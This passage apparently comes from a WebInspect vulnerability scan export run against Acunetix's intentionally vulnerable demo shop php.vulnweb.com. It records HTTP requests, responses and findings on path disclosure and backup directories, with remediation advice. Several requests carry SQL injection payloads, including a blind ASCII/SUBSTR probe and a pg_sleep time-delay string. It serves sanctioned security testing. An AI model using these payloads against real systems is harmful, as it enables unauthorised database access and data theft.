					<tr><td valign="top">Phone number:</td><td><input type="text" value="test" name="uphone" style="width:200px"></td></tr>
					<tr><td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px">test</textarea></td></tr>
					<tr><td colspan="2" align="right"><input type="submit" value="update" name="update"></td></tr>
				</table>
			</form>
			</div><div class='story'><p>You have 0 items in your cart. You visualize you cart <a href='cart.php'>here</a>.</p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  <li><a href="../logout.php">Logout</a></li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="BA84FA43201A81FE9EDB03DE1A6D46D4"><Method>POST</Method><Path>/</Path><File>userinfo</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uname=12345&amp;pass=foo%27%09OR%09(select%09ASCII(SUBSTR(schema()%2c1%2c1)))%09%3c128%09OR%09%274%27%3d%270</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0;login=test%2Ftest
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/login.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>104</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="BA84FA43201A81FE9EDB03DE1A6D46D4";PSID="885A3DDA5BF99592E4ACCDD310484D37";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="31";AttackParamDesc="pass";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="foo%2527%2509OR%2509(select%2509ASCII(SUBSTR(schema()%252c1%252c1)))%2509%253c128%2509OR%2509%25274%2527%253d%25270";AttackStringProps="Attack";tid="45";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="39";smi="0";sc="1";ID="903be015";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="526a80b6";sc="1";tid="45";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie><Cookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie>Set-Cookie: login=test%2Ftest
</SetCookie><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>user info</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
	<a href='logout.php'>Logout test</a>	</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>(SELECT pg_sleep(20)) (test)</h2><div class='story'><p>On this page you can visualize or edit you user information.</p></div><div class='story'>
      	  
			<form name="form1" method="post" action="">
				

				
				
				<table border="0" cellspacing="1" cellpadding="4">
					<tr><td valign="top">Name:</td><td><input type="text" value="(SELECT pg_sleep(20))" name="urname" style="width:200px"></td></tr>
					<tr><td valign="top">Credit card number:</td><td><input type="text" value="6341-2736-2836-9533" name="ucc" style="width:200px"></td></tr>
					<tr><td valign="top">E-Mail:</td><td><input type="text" value="test" name="uemail" style="width:200px"></td></tr>
					<tr><td valign="top">Phone number:</td><td><input type="text" value="test" name="uphone" style="width:200px"></td></tr>
					<tr><td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px">test</textarea></td></tr>
					<tr><td colspan="2" align="right"><input type="submit" value="update" name="update"></td></tr>
				</table>
			</form>
			</div><div class='story'><p>You have 0 items in your cart. You visualize you cart <a href='cart.php'>here</a>.</p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  <li><a href="../logout.php">Logout</a></li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:30 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Length</Name><Value>6004</Value></Header><Header><Name>Set-Cookie</Name><Value>login=test%2Ftest</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header></Headers><SetCookies><SetCookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Expires /><Path /><Secure>false</Secure></SetCookie></SetCookies><Forms><Form><Action /><Method>post</Method><Name>form1</Name><OnSubmit /><InputFields><InputField><Name>urname</Name><Value>(SELECT pg_sleep(20))</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>ucc</Name><Value>6341-2736-2836-9533</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>uemail</Name><Value>test</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>uphone</Name><Value>test</Value><Size /><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>update</Name><Value>update</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>uaddress</Name><Value>test</Value><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="8AE355BA9A31A432904F3379C8740C2D"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-1%20(copy)/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="e62a1698-e00d-403a-a3c6-484ea7a2b7b6"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="367" length="33" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="39fc6de9-b40b-4db5-83f2-3136b57ebf21"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11455</EngineType><AttackHTTPRequest><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-1%20(copy)/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="8AE355BA9A31A432904F3379C8740C2D";PSID="F425747E598F9ABB32C9C02592DFF52C";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="91586ee6";
X-Request-Memo: ID="31442aeb";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11485</VulnerabilityID><Severity>3</Severity><Name>Backup Directory ( (copy))</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected a backup directory with (copy) suffix on the target server. It might contain sensitive artifacts such as source code and design documents relevant to the site. Based on the directory contents, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker may use information obtained to create precise targeted attacks, which may not otherwise be feasible, against the application.  
]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker may use the information obtained from the backup directory contents to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.  

]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Prohibit storage of backup directories on webroot. Further QA can include test cases to look for the presence of backup directories in the webroot to ensure none are left in publicly accessible folders of the web application.  
]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)"> OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)  </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure  </a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="8AE355BA9A31A432904F3379C8740C2D"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-1%20(copy)/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="8AE355BA9A31A432904F3379C8740C2D";PSID="F425747E598F9ABB32C9C02592DFF52C";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="91586ee6";
X-Request-Memo: ID="31442aeb";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:36 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 136


Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></RawResponse><Request id="8AE355BA9A31A432904F3379C8740C2D"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-1%20(copy)/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="8AE355BA9A31A432904F3379C8740C2D";PSID="F425747E598F9ABB32C9C02592DFF52C";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="91586ee6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="31442aeb";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:36 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>136</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="8B37B7739FC0AF956B2D16094BA76877"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-1%20-%20Copy/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="2d1bd955-d4c1-4a18-ab7f-fa97cfc2f208"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="367" length="33" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="efff7799-88be-4d1e-b45e-db909c86f21b"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11455</EngineType><AttackHTTPRequest><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-1%20-%20Copy/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="8B37B7739FC0AF956B2D16094BA76877";PSID="F425747E598F9ABB32C9C02592DFF52C";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="809ab5ab";
X-Request-Memo: ID="48e574aa";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11486</VulnerabilityID><Severity>3</Severity><Name>Backup Directory ( - Copy)</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected a backup directory with -Copy suffix on the target server. It might contain sensitive artifacts such as source code and design documents relevant to the site. Based on the directory contents, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker may use information obtained to create precise targeted attacks, which may not otherwise be feasible, against the application.  ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker may use the information obtained from the backup directory contents to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.  
]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Prohibit storage of backup directories on webroot. Further QA can include test cases to look for the presence of backup directories in the webroot to ensure none are left in publicly accessible folders of the web application.  
